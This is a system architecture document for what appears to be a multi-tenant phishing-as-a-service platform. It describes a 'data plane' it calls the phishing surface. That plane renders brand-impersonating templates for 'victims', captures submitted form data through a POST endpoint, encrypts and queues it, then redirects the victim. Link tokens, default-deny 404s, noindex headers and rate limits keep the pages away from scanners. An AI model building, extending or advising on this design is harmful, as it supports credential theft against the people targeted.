# System

## Shape

Two planes, two deployables, one database, one shared contract.

```
                        ┌───────────────┐
   tenant browser ─────▶│ control plane │  Next.js on VPS, Node 22
   admin browser  ─────▶│  app.<p>      │  session auth, dashboard, admin, API
                        └──────┬────────┘
                               │ pg over TLS (pooled), RLS
                        ┌──────▼────────┐
                        │   Postgres    │  Neon + Hyperdrive, migrations via CI
                        └──────▲────────┘
                               │ Hyperdrive (edge role, RLS)
   victim / scanner ───▶┌──────┴────────┐
   *.tenant domains ───▶│  data plane   │  Workers + Hono
                        │  any host     │  resolve, render, capture, 404
                        └──────┬────────┘
                               │
              KV (resolution, profiles, flags) · R2 (assets, payloads)
              Queues (capture, profiles, webhooks) · Durable Objects (limits)

   apps/pipeline (Workers, no HTTP): queue consumer, sweeper, cron, webhooks out
```

Why two planes: the data plane is the phishing surface (`X-Robots-Tag`,
`frame-ancestors`, no cookies, no dashboard JS) and the control plane is a normal
authenticated app. Sharing a runtime invites a dashboard cookie onto a victim
page and a `?` param collision. The brief fixes this as a hard constraint; ADR
0001 records the cost.

## Deployables

| Unit            | Runtime                                      | Serves                                                                              | Scales by               |
| --------------- | -------------------------------------------- | ----------------------------------------------------------------------------------- | ----------------------- |
| `apps/control`  | Node 22 on VPS, behind Caddy, `app.<p>` only | dashboard, auth, admin, public API, demo page, billing checkout                     | vertical; process count |
| `apps/edge`     | Cloudflare Workers, all data hosts           | resolution, render, capture POST, assets, unbranded 404                             | Cloudflare              |
| `apps/pipeline` | Workers (queue + cron only)                  | capture consume, profile crawl, sweeper, webhook fan-out, demo reset, prune janitor | queue depth             |

`apps/pipeline` is separate from `apps/edge` so a slow consumer or a crawl
backlog never occupies the request path, and so the edge bundle stays free of
`pg` and browser-rendering code. It holds the only database write path for
captures.

## Boundary matrix

| From → To | control | edge      | pipeline  | contracts | skeleton      | db           | engine              | crypto                   |
| --------- | ------- | --------- | --------- | --------- | ------------- | ------------ | ------------------- | ------------------------ |
| control   | —       | HTTP only | —         | yes       | yes (preview) | yes          | yes (preview)       | yes (vault proxy client) |
| edge      | —       | —         | via queue | yes       | yes           | read via pg  | yes                 | yes                      |
| pipeline  | —       | —         | —         | yes       | —             | write via pg | yes (consume hooks) | yes                      |
| contracts | —       | —         | —         | —         | —             | —            | —                   | —                        |

Rules:

- `contracts` has zero dependencies outside `zod`. It is types and schemas only.
- `skeleton` is pure and synchronous: string in, string out. No bindings, no
  fetch, no `Date`.
- `db` exports schema, migrations, and repos. `edge` and `pipeline` are the only
  runtimes that import it; `control` does too, but never the raw client outside
  `packages/db`.
- `control` never imports `engine`'s renderer without going through a server-only
  module; the dashboard preview runs the same function server-side and streams
  HTML.

Enforced by `eslint-plugin-boundaries` (INV-ARCH-01).

## Data-plane request path (NORMATIVE)

```
onRequest(req):
  host = req.hostname.lower()
  if host == CONTROL_HOST or host endsWith CONTROL_SUFFIX: return notFound()   // no fallthrough
  svc, link = resolveKV(host, slug)                 // KV only, 1 read
  if !svc || !link: return notFound()
  if entFlag(svc) != 'active': return notFound()    // default deny
  if !validLinkToken(req): return notFound()
  if !limiter.allow(ip, svc): return notFoundWith429()
  tpl = engine.resolve({email, pin, svc})           // brand map → profile → cpanel
  html = engine.render(tpl)
  return html with edge headers
```

Header set on every data-plane response:
`content-type`, `cache-control: private, max-age=0, must-revalidate`,
`x-robots-tag: noindex, nofollow`, `referrer-policy: no-referrer`,
`permissions-policy: camera=(), microphone=(), geolocation=()`,
`content-security-policy: default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'`.

No cookie is set on a render. The only cookie anywhere on the data plane is the
vault session (control-host route) and the demo session.

## Capture request path (NORMATIVE)

```
onRequest(POST /c/:token):
  if !verifyLinkToken(token): return notFound()
  if !entActive(service): return notFound()
  form = await req.formData()
  cap = engine.parseCapture(form)                   // kind comes from engine
  plain = { linkId, emailHash, ...cap }
  sealed = sealCapture(dek, plain, aad)
  env.QUEUE.send(sealed)
  ctx.waitUntil(flushLog())
  return 302 to engine.redirectTarget()
```

No DB await. INV-CAP-01.

## Control-plane request path

```
onRequest:
  if host != CONTROL_HOST: 404
  session = requireSession() || redirect /login
  ctx = { orgId: session.orgId, userId, role }
  if serviceId in path: assertServiceBelongsTo(ctx)
  if !can(ctx, perm): 403
  rlsGuc(ctx)  // SET LOCAL app.org_id
  handler()
```

Control responses carry `x-robots-tag: noindex` and a dashboard CSP with
`frame-ancestors 'none'` and `connect-src 'self'`.

## Failure behaviour

| Dependency down | Data plane                                                     | Control plane                                 |
| --------------- | -------------------------------------------------------------- | --------------------------------------------- |
| Postgres        | serves from KV while flag alive; capture queues and still 302s | 503 with maintenance page, sessions preserved |
| KV              | 404 (deny)                                                     | unaffected                                    |
| R2              | render degrades to text-only logo and no backdrop              | exports 503                                   |
| Queue           | capture POST still 302s, send retried by binding               | unaffected                                    |
| NowPayments     | unaffected until expiry sweep                                  | checkout shows retry                          |

The data plane must stay correct with only KV. That is why the KV doc carries
everything needed to render except the template body.

## Environments

`dev` (local, Miniflare + Neon branch), `staging` (separate Cloudflare account,
separate Neon branch, seeded brands, no real tenants), `production`. No shared
resources across environments; staging DSN in prod fails startup.

## Repo and deploy

Turborepo with pnpm workspaces. `pnpm deploy:<unit>:<env>` maps to a Turborepo
task. Control deploys by SSH-triggered release script (build artifact, symlink
switch, migrate, health check, rollback on failure). Edge and pipeline deploy by
`wrangler deploy` after CI. Migrations run once, from CI, before the deploy that
needs them, and are backward-compatible for one release.

Last reviewed: 2026-11-20
